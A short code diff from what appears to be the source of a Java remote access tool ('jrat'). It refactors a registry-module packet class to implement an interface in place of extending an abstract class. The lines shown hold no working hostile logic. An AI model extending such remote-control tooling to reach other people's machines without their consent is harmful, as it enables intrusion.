@@ -1,12 +1,12 @@
 package jrat.module.registry;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-public class Packet54Registry extends AbstractOutgoingPacket {
+public class Packet54Registry implements OutgoingPacket {
 
 	private String path;
 
